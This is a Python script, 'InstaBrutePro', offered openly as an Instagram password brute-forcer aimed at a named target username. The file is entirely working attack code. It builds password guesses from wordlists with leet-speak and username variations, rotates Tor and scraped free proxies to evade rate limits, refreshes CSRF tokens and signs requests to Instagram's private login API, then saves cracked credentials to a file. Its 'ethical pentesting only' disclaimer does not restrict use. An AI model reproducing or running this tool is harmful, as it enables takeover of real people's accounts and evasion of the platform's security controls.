#!/usr/bin/env python3
import argparse
import json
import hashlib
import hmac
import time
import random
import threading
import itertools
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socks
import socket
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
import logging

# Setup logging
logging.basicConfig(filename='debug.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Colors
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[1;36m'
    NC = '\033[0m'

# Hacker Banner
print(f"{Colors.RED}")
print("  ____            _          ____            _       ___       ")
print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
print(f"           {Colors.CYAN} InstaBrutePro v3.3 - by Soly {Colors.NC}")
print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")

# Config
with open('config/instabrute_config.json', 'r') as f:
    CONFIG = json.load(f)
THREADS = CONFIG['threads']
DELAY = CONFIG['delay']
TOR_PORTS = CONFIG['tor_ports']
LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
UA = "Instagram 350.0.0.21.114 Android (34/14; 560dpi; 1440x3120; samsung; SM-S928B; dm3q; exynos5400; en_US; 350000000000000)"
APP_ID = "567067343352427"
SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # Update from APK if needed
CHECKPOINT_FILE = "session.json"

# Global
found = False
lock = threading.Lock()
current_delay = DELAY
attempts_since_last_proxy_refresh = 0
attempts_since_last_csrf_refresh = 0

def save_checkpoint(username, wordlist, line_number, mode):
    """Save progress to resume later."""
    with open(CHECKPOINT_FILE, 'w') as f:
        json.dump({'username': username, 'wordlist': wordlist, 'line_number': line_number, 'mode': mode}, f)

def load_checkpoint():
    """Load saved progress."""
    try:
        with open(CHECKPOINT_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return None

def leet_speak(keyword):
    """Generate leet speak variations (e.g., apple -> 4ppl3)."""
    replacements = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$']}
    variations = [keyword]
    for char, subs in replacements.items():
        new_variations = []
        for var in variations:
            for sub in subs:
                new_variations.append(var.replace(char, sub).replace(char.upper(), sub))
        variations.extend(new_variations)
    return list(set(variations))

def interleave_keywords(keyword1, keyword2):
    """Interleave two keywords (e.g., apple, 2511 -> ap25ple11)."""
    result = []
    min_len = min(len(keyword1), len(keyword2))
    interleaved = ''
    for i in range(min_len):
        interleaved += keyword1[i] + keyword2[i]
    if len(keyword1) > min_len:
        interleaved += keyword1[min_len:]
    if len(keyword2) > min_len:
        interleaved += keyword2[min_len:]
    result.append(interleaved)
    return result

def generate_variations(keywords, username, mode, max_variations):
    """Generate password variations, enforcing 6-char minimum."""
    variations = set()
    username_parts = [username] + username.split('123')[:1]  # e.g., testuser123 -> testuser

    if mode in ['two-keyword', 'all']:
        for combo in itertools.permutations(keywords, 2):
            keyword1, keyword2 = combo
            for leet1 in leet_speak(keyword1):
                for leet2 in leet_speak(keyword2):
                    combo1 = f"{leet1}{leet2}"
                    combo2 = f"{leet2}{leet1}"
                    if len(combo1) >= 6:
                        variations.add(combo1)
                    if len(combo2) >= 6:
                        variations.add(combo2)
                    for interleaved in interleave_keywords(leet1, leet2):
                        if len(interleaved) >= 6:
                            variations.add(interleaved)
                    for part in username_parts:
                        combo3 = f"{part}{leet1}{leet2}"
                        combo4 = f"{leet1}{leet2}{part}"
                        if len(combo3) >= 6:
                            variations.add(combo3)
                        if len(combo4) >= 6:
                            variations.add(combo4)

    if mode in ['normal', 'all']:
        for keyword in keywords:
            if len(keyword) >= 6:
                variations.add(keyword)
            for leet_var in leet_speak(keyword):
                if len(leet_var) >= 6:
                    variations.add(leet_var)
                    for part in username_parts:
                        combo5 = f"{part}{leet_var}"
                        combo6 = f"{leet_var}{part}"
                        if len(combo5) >= 6:
                            variations.add(combo5)
                        if len(combo6) >= 6:
                            variations.add(combo6)

    return list(variations)[:max_variations] if max_variations != 'unlimited' else list(variations)

def is_valid_proxy(proxy):
    """Validate proxy against instagram.com:443."""
    if not proxy.startswith('socks5://'):
        return False
    try:
        host, port = proxy.split('://')[1].split(':')
        port = int(port)
        if host == 'placeholder' or not host or port < 1 or port > 65535:
            return False
        socks.set_default_proxy(socks.SOCKS5, host, port)
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('https://', adapter)
        session.headers = {'User-Agent': UA}
        resp = session.get("https://www.instagram.com", timeout=15)
        session.close()
        return resp.status_code == 200
    except Exception as e:
        logging.debug(f"Proxy validation failed for {proxy}: {str(e)}")
        return False

def fetch_proxies():
    """Fetch proxies from multiple sources."""
    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://www.free-proxy-list.net/anonymous-proxy.txt",
        "https://api.openproxy.space/list?type=socks5"
    ]
    for source in sources:
        try:
            resp = requests.get(source, timeout=15)
            if resp.status_code == 200:
                if source.endswith('.txt'):
                    new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip()]
                else:
                    new_proxies = [f"socks5://{p['ip']}:{p['port']}" for p in resp.json() if p.get('ip') and p.get('port')]
                proxies.extend([p for p in new_proxies if is_valid_proxy(p) and p not in proxies])
            else:
                print(f"{Colors.RED}[!] Proxy fetch failed from {source}{Colors.NC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Proxy fetch error from {source}: {e}{Colors.NC}")
    return proxies

def refresh_proxies():
    """Refresh and save proxies."""
    proxies = fetch_proxies()
    random.shuffle(proxies)
    with open('proxies/free_proxies.txt', 'w') as f:
        f.write('\n'.join(proxies))
    return proxies[:500]

def get_proxies():
    proxies = fetch_proxies()
    try:
        with open('proxies/free_proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and is_valid_proxy(line) and line not in proxies:
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Proxies file missing! Fetching new proxies.{Colors.NC}")
    return proxies

def sort_proxies(proxies):
    working = []
    print(f"{Colors.YELLOW}[*] Validating proxies against instagram.com...{Colors.NC}")
    with ThreadPoolExecutor(max_workers=50) as exec:
        working = [p for p in exec.map(lambda p: p if is_valid_proxy(p) else None, proxies) if p]
    with open('proxies/working_proxies.txt', 'w') as f:
        f.write('\n'.join(working))
    print(f"{Colors.GREEN}[+] {len(working)} working proxies saved!{Colors.NC}")
    return working

def check_tor_ports():
    """Check if Tor ports are active."""
    working_ports = []
    for port in TOR_PORTS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(('127.0.0.1', int(port)))
            sock.close()
            working_ports.append(port)
        except:
            print(f"{Colors.RED}[!] Tor port {port} is down{Colors.NC}")
    if not working_ports:
        print(f"{Colors.RED}[!] No active Tor ports! Start Tor with ./multitor.sh{Colors.NC}")
    return working_ports

def get_csrf(proxies):
    for _ in range(10):
        proxy = random.choice(proxies)
        if not is_valid_proxy(proxy):
            print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
            continue
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('https://', adapter)
        session.headers = {'User-Agent': UA}
        print(f"{Colors.YELLOW}[*] Fetching CSRF token via {proxy}...{Colors.NC}")
        try:
            resp = session.get("https://www.instagram.com/accounts/login/", timeout=15)
            logging.debug(f"CSRF request response: {resp.text}")
            csrf = resp.cookies.get('csrftoken', '')
            session.close()
            if csrf:
                print(f"{Colors.GREEN}[+] CSRF token obtained!{Colors.NC}")
                return csrf
            print(f"{Colors.RED}[!] No CSRF token - Retrying...{Colors.NC}")
        except Exception as e:
            print(f"{Colors.RED}[!] CSRF fetch error: {e}{Colors.NC}")
            logging.debug(f"CSRF fetch error: {str(e)}")
        finally:
            session.close()
    return None

def sign_payload(payload):
    body = json.dumps(payload, separators=(',', ':'))
    sig = hmac.new(SIG_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
    return f"ig_sig_key_version=4&signed_body={sig}.{body}"

def try_password(username, password, proxies):
    global found, current_delay, attempts_since_last_proxy_refresh, attempts_since_last_csrf_refresh
    csrf = None
    if attempts_since_last_csrf_refresh >= 50:
        csrf = get_csrf(proxies)
        if not csrf:
            print(f"{Colors.RED}[!] Failed to refresh CSRF token{Colors.NC}")
            return False, None
        attempts_since_last_csrf_refresh = 0
    # Try up to 5 proxies
    for _ in range(5):
        proxy = random.choice(proxies)
        if not is_valid_proxy(proxy):
            print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
            continue
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('https://', adapter)
        session.headers = {
            'User-Agent': UA,
            'X-IG-App-ID': APP_ID,
            'X-CSRFToken': csrf or get_csrf(proxies),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
        }
        if not session.headers['X-CSRFToken']:
            print(f"{Colors.RED}[!] No CSRF token available{Colors.NC}")
            session.close()
            continue
        timestamp = str(int(time.time()))
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        signed = sign_payload(payload)
        try:
            resp = session.post(LOGIN_URL, data=signed, timeout=15)
            attempts_since_last_proxy_refresh += 1
            attempts_since_last_csrf_refresh += 1
            time.sleep(current_delay + random.uniform(0, 0.5))
            logging.debug(f"Login attempt for {username}:{password} via {proxy} - Status: {resp.status_code}, Response: {resp.text}")
            try:
                json_resp = resp.json()
            except ValueError:
                logging.debug(f"Invalid JSON response for {password}: {resp.text}")
                print(f"{Colors.RED}[!] Invalid API response for {password}{Colors.NC}")
                current_delay = min(current_delay * 2, 2.0)
                continue
            if (json_resp.get('authenticated') is True or
                json_resp.get('status') == 'ok' or
                'logged_in_user' in json_resp or
                'user_id' in json_resp):
                with lock:
                    print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                    with open('hits/cracked.txt', 'a') as f:
                        f.write(f"{username}:{password}\n")
                    found = True
                    return True, csrf
            elif any(x in resp.text for x in ['checkpoint_required', 'two_factor_required']):
                print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required!{Colors.NC}")
                logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
                current_delay = min(current_delay * 2, 2.0)
                return False, csrf
            elif any(x in resp.text for x in ['"spam":true', 'rate_limit']):
                print(f"{Colors.RED}[!] Rate limit on {password} - Rotating proxy{Colors.NC}")
                current_delay = min(current_delay * 2, 2.0)
                continue
            else:
                print(f"{Colors.CYAN}[-] Fail: {password}{Colors.NC}")
                current_delay = max(current_delay * 0.9, DELAY)
                return False, csrf
        except Exception as e:
            print(f"{Colors.RED}[!] Error for {password}: {e}{Colors.NC}")
            logging.debug(f"Error for {password}: {str(e)}")
            current_delay = min(current_delay * 2, 2.0)
            continue
        finally:
            session.close()
    return False, csrf

def worker(queue, username, proxies, mode):
    global attempts_since_last_proxy_refresh, attempts_since_last_csrf_refresh
    while not queue.empty() and not found:
        pw = queue.get()
        if len(pw) < 6:
            print(f"{Colors.CYAN}[-] Skipping {pw} (less than 6 chars){Colors.NC}")
            queue.task_done()
            continue
        success, new_csrf = try_password(username, pw, proxies)
        if attempts_since_last_proxy_refresh >= 500:
            print(f"{Colors.YELLOW}[*] Refreshing proxies...{Colors.NC}")
            proxies[:] = refresh_proxies()
            attempts_since_last_proxy_refresh = 0
        queue.task_done()

def select_mode():
    """Interactive mode selection."""
    print(f"{Colors.YELLOW}[*] Select brute-force mode:{Colors.NC}")
    print("1. Two-Keyword Mode (e.g., apple + 2511 -> apple2511, ap25ple11)")
    print("2. Normal Mode (use passwords from wordlist as-is)")
    print("3. All Mode (two-keyword combos, leet speak, username variations, normal)")
    while True:
        choice = input(f"{Colors.CYAN}Enter choice (1-3): {Colors.NC}")
        if choice == '1':
            return 'two-keyword'
        elif choice == '2':
            return 'normal'
        elif choice == '3':
            return 'all'
        print(f"{Colors.RED}[!] Invalid choice. Try again.{Colors.NC}")

def main():
    global resume_line, current_delay
    parser = argparse.ArgumentParser(description="InstaBrutePro: Smartest Instagram Brute-Forcer by Soly")
    parser.add_argument('-u', required=True, help='Target username')
    parser.add_argument('-w', default='wordlists/password.txt', help='Keyword or password list')
    parser.add_argument('-t', type=int, default=THREADS, help='Threads')
    parser.add_argument('-r', action='store_true', help='Resume session')
    parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
    parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
    parser.add_argument('--max-variations', default='50000', help='Max password variations (except normal mode, or "unlimited")')
    args = parser.parse_args()

    # Parse max_variations
    max_variations = args.max_variations.lower() == 'unlimited' and 'unlimited' or int(args.max_variations)

    # Select mode interactively
    mode = select_mode()
    print(f"{Colors.GREEN}[+] Selected mode: {mode}{Colors.NC}")

    # Validate user
    print(f"{Colors.YELLOW}[*] Validating username: {args.u}...{Colors.NC}")
    import subprocess
    result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
    if "Valid" not in result.stdout:
        print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
        return

    # Check Tor ports
    print(f"{Colors.YELLOW}[*] Checking Tor ports...{Colors.NC}")
    active_tor_ports = check_tor_ports()
    if not active_tor_ports:
        return

    # Pre-fetch and validate proxies
    print(f"{Colors.YELLOW}[*] Pre-fetching proxies...{Colors.NC}")
    proxies = get_proxies()
    proxies = sort_proxies(proxies)
    if not proxies:
        print(f"{Colors.RED}[!] No valid proxies available! Exiting{Colors.NC}")
        return

    # Pre-fetch CSRF token
    print(f"{Colors.YELLOW}[*] Pre-fetching CSRF token...{Colors.NC}")
    csrf = get_csrf(proxies)
    if not csrf:
        print(f"{Colors.RED}[!] Failed to fetch CSRF token - Exiting{Colors.NC}")
        return
    print(f"{Colors.GREEN}[+] Loaded {len(proxies)} working proxies and CSRF token{Colors.NC}")

    # Load keywords/passwords
    print(f"{Colors.YELLOW}[*] Loading {mode} mode from: {args.w}...{Colors.NC}")
    try:
        with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
            keywords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[!] File not found: {args.w}{Colors.NC}")
        return

    # Generate variations based on mode
    if mode == 'normal':
        words = [w for w in keywords if len(w) >= 6]
    else:
        words = generate_variations(keywords, args.u, mode, max_variations)
    print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")

     # Load checkpoint
    if args.r:
        checkpoint = load_checkpoint()
        if checkpoint and checkpoint['username'] == args.u and checkpoint['wordlist'] == args.w and checkpoint['mode'] == mode:
            resume_line = checkpoint['line_number']
            print(f"{Colors.YELLOW}[*] Resuming from line {resume_line}{Colors.NC}")
            words = words[resume_line:]
        else:
            print(f"{Colors.RED}[!] Invalid checkpoint. Starting from beginning.{Colors.NC}")
            resume_line = 0

    print(f"{Colors.GREEN}[+] Loaded {len(words)} passwords, {len(proxies)} proxies, {args.t} threads{Colors.NC}")

    queue = Queue()
    for i, word in enumerate(words):
        queue.put(word)
        if i % 1000 == 0 and i > 0:
            save_checkpoint(args.u, args.w, i, mode)

    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} in {mode} mode... Buckle up!{Colors.NC}")
    with ThreadPoolExecutor(max_workers=args.t) as exec:
        futures = [exec.submit(worker, queue, args.u, proxies, mode) for _ in range(args.t)]
        for future in futures:
            future.result()

    print(f"{Colors.GREEN}[+] Brute-force complete! Check hits/cracked.txt{Colors.NC}")

if __name__ == "__main__":
    main()